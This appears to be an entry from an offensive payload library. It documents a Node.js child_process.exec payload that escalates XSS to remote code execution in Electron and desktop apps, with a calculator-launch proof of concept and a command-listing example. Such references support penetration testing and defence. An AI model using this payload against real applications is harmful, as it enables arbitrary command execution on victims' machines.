---
id: cmd-exec-child-process-001
data: 'require(''child_process'').exec(''/usr/bin/gnome-calculator'',function(){})'
tags:
  - rce
  - nodejs
  - child-process
type: command
output: Gnome calculator launches
executor: javascript
platforms:
  - Desktop
  - Electron
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:28.392Z'
verified: false
validated: true
submitted: true
---
# exec-child-process-rce

## Command

```javascript
require('child_process').exec('/usr/bin/gnome-calculator',function(){})
```

## Description

Executes a system command using Node.js child_process module from XSS, spawning an application for RCE; used in both encoded print payloads and javascript: URLs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| command | Shell command to execute | Yes |
| callback | Function to handle output (empty for fire-and-forget) | No |

## Examples

### Basic Usage

```javascript
require('child_process').exec('/usr/bin/gnome-calculator',function(){})
```

### Advanced Usage

```javascript
require('child_process').exec('ls -la', (err, stdout) => { console.log(stdout); })
```

## Expected Output

The command runs, launching the application without visible output in this context.

## Related

- [[Related Procedure: Execute-RCE-and-Post-Fix-Exploitation]]
